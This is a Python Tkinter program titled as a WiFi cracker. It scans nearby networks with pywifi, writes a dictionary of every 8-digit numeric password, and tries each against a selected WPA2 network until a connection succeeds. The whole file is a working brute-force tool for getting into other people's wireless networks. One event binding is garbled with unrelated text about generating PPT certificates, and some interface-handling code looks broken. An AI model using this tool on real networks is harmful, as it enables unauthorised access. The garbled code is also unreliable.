import itertools
import os
import time
import tkinter.messagebox
from tkinter import *
from tkinter import ttk

import pywifi
from pywifi import const


class Wifi_GUI():
    def __init__(self, init_window_name):
        self.init_window_name = init_window_name
        self.get_value = StringVar()
        self.get_wifi_value = StringVar()
        self.get_wifimm_value = StringVar()
        self.wifi = pywifi.PyWiFi()
        self.iface = self.wifi.interfaces()[0]
        self.iface.disconnect()
        time.sleep(1)
        assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    def __repr__(self):
        return '(WIFI:%s,%s)' % (self.wifi, self.iface.name())

    def set_init_window(self):
        self.init_window_name.title("money哥破解WIFI")
        self.init_window_name.geometry('+500+200')
        labelframe = LabelFrame(width=400, height=300, text="配置")
        labelframe.grid(column=0, row=0, padx=10, pady=10)
        self.search = Button(labelframe, text="搜索可用WiFi", command=self.scans_wifi_list).grid(column=0, row=0)
        self.pojie = Button(labelframe, text="开始破解", command=self.readPassWord).grid(column=1, row=0)
        self.label = Label(labelframe, text="密码库文件路径：").grid(column=0, row=1)
        self.path = Entry(labelframe, width=12, textvariable=self.get_value).grid(column=1, row=1)
        self.file = Button(labelframe, text="生成密码库文件", command=self.creat_pwd).grid(column=2, row=1)
        self.wifi_text = Label(labelframe, text="WiFi名称：").grid(column=0, row=2)
        self.wifi_input = Entry(labelframe, width=12, textvariable=self.get_wifi_value).grid(column=1, row=2)
        self.wifi_mm_text = Label(labelframe, text="WiFi密码：").grid(column=2, row=2)
        self.wifi_mm_input = Entry(labelframe, width=10, textvariable=self.get_wifimm_value).grid(column=3, row=2, sticky=W)
        self.wifi_labelframe = LabelFrame(text="可用wifi列表")
        self.wifi_labelframe.grid(column=0, row=3, columnspan=4, sticky=NSEW)
        self.wifi_tree = ttk.Treeview(self.wifi_labelframe, show="headings", columns=("a", "b", "c", "d"))
        self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)
        self.wifi_tree.configure(yscrollcommand=self.vbar.set)
        self.wifi_tree.column("a", width=50, anchor="center")
        self.wifi_tree.column("b", width=100, anchor="center")
        self.wifi_tree.column("c", width=100, anchor="center")
        self.wifi_tree.column("d", width=100, anchor="center")
        self.wifi_tree.heading("a", text="WiFiID")
        self.wifi_tree.heading("b", text="SSID")
        self.wifi_tree.heading("c", text="BSSID")
        self.wifi_tree.heading("d", text="signal")
        self.wifi_tree.grid(row=4, column=0, sticky=NSEW)
        self.wifi_tree.bind("<Double-实例25_批量生成PPT版荣誉证书>", self.onDBClick)
        self.vbar.grid(row=4, column=1, sticky=NS)
        self.get_value.set(os.getcwd().replace('\\', '/')+'/password.txt')

    def scans_wifi_list(self):
        print("@@@启动扫描可用wifi...")
        self.iface.scan()
        time.sleep(15)
        scanres = self.iface.scan_results()
        nums = len(scanres)
        print("数量: %s" % (nums))
        self.show_scans_wifi_list(scanres)

    def show_scans_wifi_list(self, scans_res):
        for index, wifi_info in enumerate(scans_res):
            self.wifi_tree.insert("", 'end', values=(index + 1, wifi_info.ssid, wifi_info.bssid, wifi_info.signal))

    def creat_pwd(self):
        key = '0123456789'
        passwords = itertools.product(key, repeat=8)
        with open('password.txt', 'a') as f:
            for i in passwords:
                f.write("".join(i))
                f.write('\n')
        self.get_value.set(os.getcwd().replace('\\', '/') + '/password.txt')

    def onDBClick(self, event):
        self.sels = event.widget.selection()
        self.get_wifi_value.set(self.wifi_tree.item(self.sels, "values")[1])

    def readPassWord(self):
        self.getFilePath = self.get_value.get()
        self.get_wifissid = self.get_wifi_value.get()
        with open(self.getFilePath, "r", errors="ignore") as pwdfilehander:
            while True:
                try:
                    self.pwdStr = pwdfilehander.readline()
                    if not self.pwdStr:
                        break
                    self.bool1 = self.connect(self.pwdStr, self.get_wifissid)
                    if self.bool1:
                        self.res = "密码正确！wifi名：%s，匹配密码：%s " % (self.get_wifissid, self.pwdStr)
                        self.get_wifimm_value.set(self.pwdStr)
                        tkinter.messagebox.showinfo('提示', '破解成功！！！')
                        print(self.res)
                        break
                    else:
                        self.res = "密码错误！wifi名:%s，匹配密码：%s" % (self.get_wifissid, self.pwdStr)
                        print(self.res)
                    time.sleep(3)
                except:
                    continue

    def connect(self, pwd_Str, wifi_ssid):
        self.profile = pywifi.Profile()
        self.profile.ssid = wifi_ssid
        self.profile.auth = const.AUTH_ALG_OPEN
        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)
        self.profile.cipher = const.CIPHER_TYPE_CCMP
        self.profile.key = pwd_Str
        self.iface.remove_all_network_profiles()
        self.tmp_profile = self.iface.add_network_profile(self.profile)
        self.iface.connect(self.tmp_profile)
        time.sleep(5)
        isOK = self.iface.status() == const.IFACE_CONNECTED
        with self.iface:
            time.sleep(1)
            assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
        return isOK

if __name__ == "__main__":
    init_window = Tk()
    ui = Wifi_GUI(init_window)
    print(ui)
    ui.set_init_window()
    init_window.mainloop()